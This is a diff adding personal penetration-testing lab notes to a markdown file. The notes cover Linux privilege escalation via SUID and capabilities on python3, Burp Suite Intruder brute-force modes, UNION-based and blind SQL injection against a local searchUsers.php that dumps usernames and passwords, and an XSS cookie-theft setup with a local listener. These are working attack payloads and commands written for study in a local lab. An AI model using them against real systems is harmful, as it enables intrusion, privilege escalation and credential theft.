@@ -794,10 +794,245 @@ f0f8820ee817181d9c6852a097d70d8d:frodo
 ## ENumeración del sistema
 - Reconocimiento: Detectar un falla para elevar privilegios
 
+https://github.com/diego-treitos/linux-smart-enumeration
+https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+
+
 ```bash
+# -- automated
+./lse.sh # downloaded with wgert in github raw mode
+
+# -- manuak
+whoami
+id
+find -perm -4000 2>/dev/null #suid
+find -perm -4000 -ls 2>/dev/null #suid
+
+# exec binary files like owner (root)
+# example
+which python3
+chmod u+s /usr/bin/python3
+find -perm -4000 -ls 2>/dev/null
+
+python3 # being not root
+import os
+os.system("whoami")
+os.setuid(0) # root
+os.system("bash")
+
+chmod 755 /usr/bin/python3 # quit suid perm
+
+```
+
+#### CApabilities
+```bash
+getcap -r / 2>/dev/null # exec being root
+
+# example
+setcap cap_setuid+ep /usr/bin/python3.11
+realpath /usr/bin/python3 # solving error
+sudo setcap cap_setuid+ep /usr/bin/python3.11
+
+getcap -r / 2>/dev/null # exec being root. we can find python 3.11
+which python3.11 | xargs getcap # being root
+
+python3 # being not root
+import os
+os.system("whoami")
+os.setuid(0) # root
+os.system("bash")
+
+setcap -r /usr/bin/python3.11 # quitting caps
+```
+
+#### CRON
+```bash
+crontab -l
+cat /etc/crontab
+
+systemctl list-timers
 
 
 ```
+
+#### TAreas
+https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1
+
+```bash
+# -- automated
+chmod +x pspy
+./pspy
+2025/03/06 12:59:01 CMD: UID=1000  PID=135935 | nano # res
+
+ps -eo command
+ps -eo user,command
+
+procmon.sh
+
+
+```
+https://gtfobins.github.io/
+
+https://book.hacktricks.wiki/en/index.html
+
+## Burpsuite
+### Intercept
+```bash
+
+# REPEATER= Traza
+
+# CHeck in Proxy, options and dont sen if its out of the scope
+# In TARGET, scope, add and set the URL
+
+# PROXY - HTTP HIistory
+# To do a forward and get the response we can do right cikc and seelct do intercept and the click on forward
+
+```
+
+#### Replace header response
+![alt text](image-1.png)
+
+#### Intercept responses too
+![alt text](image-2.png)
+
+#### Intercept and send, forward
+New code 201 validation (201 TEST)
+![alt text](image-3.png)
+
+- Click on 'DROP' to cancel request
+
+#### REplace in response body
+![alt text](image-4.png)
+
+### Intruder
+
+`ctrl + i`
+
+![alt text](image-5.png)
+
+right click in password word and select `Add payload position`
+![alt text](image-6.png)
+
+#### Sniper attack
+https://github.com/danielmiessler/SecLists - WArehouse of pass and FUZZ
+
+- DOwnload file with 10,000 most used passwords and set into burpsuite
+- Remove check in URL encode
+
+#### CLuster bomb attackt
+SAme attack like sniper but using username and pass. It does the payload like a anidated loop for
+
+#### BAtering ram attack
+Use tha same word int he dictionary to bot fields (user and pass)
+
+## SQLI (SQL Injection)
+```bash
+apt install mariadb-server apache2 php-mysql
+service mysql start
+lsof -i:3306
+
+service apache2 start
+lsof -i:80
+
+mysql -uroot -p
+use mysql;
+show tables;
+describe user;
+create user 'edibauer'@'localhost' identified by 'edibauer123';
+grant all privileges on h4ckforyou.* to 'edibauer'@'localhost';
+
+http://localhost/searchUsers.php?id=3' order by 1-- -
+# the first simple comma close the internal query and the final comment comments the original simple comma in the original query
+
+# Must be the number on columns (1,2,3,4,5,6)
+
+http://localhost/searchUsers.php?id=369' union select "hola"-- -
+# change id=369 to get empty the qwury and fill with union select
+
+http://localhost/searchUsers.php?id=369%27%20union%20select%20database()--%20-
+
+http://localhost/searchUsers.php?id=369%27%20union%20select%20group_concat(schema_name)%20from%20information_schema.schemata--%20-
+
+http://localhost/searchUsers.php?id=369%27%20union%20select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27h4ckforyou%27--%20-
+
+http://localhost/searchUsers.php?id=369%27%20union%20select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=%27h4ckforyou%27%20and%20table_name=%20%27users%27--%20-
+
+http://localhost/searchUsers.php?id=369%27%20union%20select%20group_concat(username)%20from%20users--%20-
+
+http://localhost/searchUsers.php?id=369%27%20union%20select%20group_concat(username,%27:%27,password)%20from%20users--%20-
+
+http://localhost/searchUsers.php?id=369%27%20union%20select%20group_concat(username,0x3a,password)%20from%20users--%20-
+
+# If the id is not in simple comma we can put directlt the query without using smiple comma ' or coment at EOL
+
+http://localhost/searchUsers.php?id=1 union select 1
+
+
+```
+
+https://extendsclass.com/mysql-online.html
+
+- Boolean-based blind SQL Injection
+
+```sql
+select (select substring(username,1,1) from users where id = 1)='a'
+select (select ascii(substring(username,1,1)) from users where id = 1)=97 -- ASCII
+
+
+```
+```bash
+
+curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=2"
+
+curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=2 or 1=1"
+
+curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=2 or (select (select ascii(substring(username,1,1)) from users where id = 1)=97)"
+
+curl -s -X GET "http://localhost/searchUsers.php?id=1" -I
+
+❯ curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=9 or (select (select ascii(substring(username,1,1)) from users where id = 1)=97)"
+HTTP/1.1 200 OK
+Date: Sun, 09 Mar 2025 19:41:39 GMT
+Server: Apache/2.4.62 (Debian)
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+
+```
+
+## XSS Injection
+```bash
+python3 -m http.server 80 # to view emails
+
+python3 -m http.server 80 2>&1 | grep -oP 'GET.*' # 2&1 send stderr to stdout
+
+```
+- In every session there is a jwt for every user
+- Pass to false httponly or uncheck
+- upload the file at attack person and open blog at victim's sesion to theft Cookie
+
+![alt text](image-7.png)
+
+```bash
+echo -n "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCiAgPGhlYWQ+CgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLCBzaHJpbmstdG8tZml0PW5vIj4KICAgIDxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSIiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSIiPgoKICAgIDx0aXRsZT5Hb3NzaXAgV29ybGQgLSA8L3RpdGxlPgoKICAgIDwhLS0gQm9vdHN0cmFwIGNvcmUgQ1NTIC0tPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIvc3RhdGljL2Nzcy9ib290c3RyYXAubWluLmNzcyI+CgoKICAgIDwhLS0gQ3VzdG9tIHN0eWxlcyBmb3IgdGhpcyB0ZW1wbGF0ZSAtLT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iL3N0YXRpYy9jc3MvYmxvZy1wb3N0LmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9zdGF0aWMvY3NzL2xvZ2luLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9zdGF0aWMvY3NzL25ld3Bvc3QuY3NzIj4KCgogIDwvaGVhZD4KCiAgPGJvZHk+CgogICAgPCEtLSBOYXZpZ2F0aW9uIC0tPgogICAgPG5hdiBjbGFzcz0ibmF2YmFyIG5hdmJhci1leHBhbmQtbGcgbmF2YmFyLWRhcmsgYmctZGFyayBmaXhlZC10b3AiPgogICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxhIGNsYXNzPSJuYXZiYXItYnJhbmQiIGhyZWY9Ii9nb3NzaXAiPkdvc3NpcCBXb3JsZDwvYT4KICAgICAgICA8YnV0dG9uIGNsYXNzPSJuYXZiYXItdG9nZ2xlciIgdHlwZT0iYnV0dG9uIiBkYXRhLXRvZ2dsZT0iY29sbGFwc2UiIGRhdGEtdGFyZ2V0PSIjbmF2YmFyUmVzcG9uc2l2ZSIgYXJpYS1jb250cm9scz0ibmF2YmFyUmVzcG9uc2l2ZSIgYXJpYS1leHBhbmRlZD0iZmFsc2UiIGFyaWEtbGFiZWw9IlRvZ2dsZSBuYXZpZ2F0aW9uIj4KICAgICAgICAgIDxzcGFuIGNsYXNzPSJuYXZiYXItdG9nZ2xlci1pY29uIj48L3NwYW4+CiAgICAgICAgPC9idXR0b24+CiAgICAgICAgPGRpdiBjbGFzcz0iY29sbGFwc2UgbmF2YmFyLWNvbGxhcHNlIiBpZD0ibmF2YmFyUmVzcG9uc2l2ZSI+CiAgICAgICAgICA8dWwgY2xhc3M9Im5hdmJhci1uYXYgbWwtYXV0byI+CiAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPgogICAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iL2dvc3NpcCI+SG9tZTwvYT4KICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSBhY3RpdmUiPgogICAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iL25ld2dvc3NpcCI+TmV3IGdvc3NpcAogICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJzci1vbmx5Ij4oY3VycmVudCk8L3NwYW4+CiAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICA8L2xpPgogICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ii9sb2dvdXQiPkxvZ291dDwvYT4KICAgICAgICAgICAgPC9saT4KICAgICAgICAgIDwvdWw+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9uYXY+CgoKICAgICAgIDxicj4KICAgICAgIDxicj4KICAgICAgIDxkaXYgY2xhc3M9ImRpdi1wb3N0LXNpemUiPgogICAgICAgCTxkaXYgY2xhc3M9InBhbmVsIHBhbmVsLWRlZmF1bHQiPgogICAgICAgCQk8ZGl2IGNsYXNzPSJwYW5lbC1ib2R5Ij4KICAgICAgICAgICAgICAgIDxicj4KICAgICAgICAgICAgICAgIDxicj4KCiAgICAgICAgICAgICAgICA8Y2VudGVyPjxoND5OZXcgZ29zc2lwPC9oND48L2NlbnRlcj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAJCQk8Zm9ybSBhY3Rpb249Ii9uZXdnb3NzaXAiIG5hbWU9Im5ld2dvc3NpcCIgbWV0aG9kPSJQT1NUIiA+CiAgICAgICAJCQkJPGNlbnRlcj48aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImlucHV0LWxvZ2luIiB2YWx1ZT0iIiBuYW1lPSAidGl0bGUiIGFyaWEtZGVzY3JpYmVkYnk9InNpemluZy1hZGRvbjEiICBtYXhsZW5ndGg9IjEwMCIgcGxhY2Vob2xkZXI9IlRpdGxlIj48L2NlbnRlcj4KICAgICAgIAkJCQk8YnI+CiAgICAgICAgICAgICAgICAgIDxjZW50ZXI+PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJpbnB1dC1sb2dpbiIgdmFsdWU9IiIgbmFtZT0gInN1YnRpdGxlIiBhcmlhLWRlc2NyaWJlZGJ5PSJzaXppbmctYWRkb24xIiAgbWF4bGVuZ3RoPSIyMDAiIHBsYWNlaG9sZGVyPSJTdWJ0aXRsZSI+PC9jZW50ZXI+CiAgICAgICAJCQkJPGJyPgogICAgICAgICAgICAgICAgICA8Y2VudGVyPjx0ZXh0YXJlYSBjbGFzcz0iaW5wdXQtbG9naW4iIHZhbHVlPSIiIG5hbWU9ICJ0ZXh0IiBhcmlhLWRlc2NyaWJlZGJ5PSJzaXppbmctYWRkb24xIiAgbWF4bGVuZ3RoPSIyMDAwIiByb3dzPSIxMCIgcGxhY2Vob2xkZXI9IlRleHQiPjwvdGV4dGFyZWE+PC9jZW50ZXI+CiAgICAgICAJCQkJPGJyPgogICAgICAgCQkJCTxpbnB1dCBuYW1lPSJfY3NyZl90b2tlbiIgdHlwZT0iaGlkZGVuIiB2YWx1ZT0iNTNjYjFmOWYtYzNjMS00ZmI1LTkzYTgtNGU5YTU1YjM1Yzg1Ij4KICAgICAgIAkJCQk8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBmdWxsLXdpZHRoIiBzdHlsZT0id2lkdGg6IDEwMCU7ICI+R08hPC9idXR0b24+CiAgICAgICAJCQk8L2Zvcm0+CiAgICAgICAJCTwvZGl2PgogICAgICAgCTwvZGl2PgogICAgICAgPC9kaXY+CiAgICAgICA8L2JyPgogICAgICAgPC9icj4KCiAgICA8IS0tIEZvb3RlciAtLT4KICAgIDxmb290ZXIgY2xhc3M9InB5LTUgYmctZGFyayI+CiAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgPHAgY2xhc3M9Im0tMCB0ZXh0LWNlbnRlciB0ZXh0LXdoaXRlIj5Db3B5cmlnaHQgJmNvcHk7IEdvc3NpcCBXb3JsZCAyMDE4PC9wPgogICAgICA8L2Rpdj4KICAgICAgPCEtLSAvLmNvbnRhaW5lciAtLT4KICAgIDwvZm9vdGVyPgoKICAgIDwhLS0gQm9vdHN0cmFwIGNvcmUgSmF2YVNjcmlwdCAtLT4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3IvanF1ZXJ5L2pxdWVyeS5taW4uanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9InZlbmRvci9ib290c3RyYXAvanMvYm9vdHN0cmFwLmJ1bmRsZS5taW4uanMiPjwvc2NyaXB0PgoKICA8L2JvZHk+Cgo8L2h0bWw+" | base64 -d; echo
+
+echo "Odio a mi equipo de trabajo y mi jefe es un cabrón, no me sube el sueldo" | sed 's/ /%20/g'
+
+
+```
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
 
 
 
